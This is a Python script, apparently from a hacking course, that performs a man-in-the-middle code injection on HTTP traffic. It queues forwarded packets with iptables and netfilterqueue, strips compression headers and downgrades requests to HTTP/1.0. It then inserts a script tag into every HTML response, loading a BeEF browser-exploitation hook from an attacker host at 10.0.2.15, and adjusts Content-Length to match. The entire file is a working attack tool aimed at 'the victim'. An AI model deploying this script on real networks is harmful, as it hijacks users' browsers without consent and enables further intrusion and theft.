#!/usr/bin/env python

# Import Modules
import netfilterqueue
import scapy.all as scapy
import subprocess
import re


# Function to replace the packet's load
def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


# Function to convert packets that were captured in the queue to a scapy packet for manipulation
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] Request")
            # Modify packet to say that the victim/requester cannot accept encoding
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
            # Modify packet to say that the victim/requester only accepts HTTP 1.0 (so response packets aren't split and Content-Length field exists in response packet)
            load = load.replace("HTTP/1.1", "HTTP/1.0")
        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] Response")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            # Hook the victim to Beef framework
            injection_code = '<script src="http://10.0.2.15:3000/hook.js"></script>'
            load = load.replace("</body>", injection_code + "</body>")
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))
                
        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))

    packet.accept()


# Create queue
subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)

# Bind queue to a Python object
try:
    queue = netfilterqueue.NetfilterQueue()
    # 1st parameter is ID of the queue, 2nd parameter is a callback function that is called for each packet in the queue
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    subprocess.call("iptables --flush", shell=True)
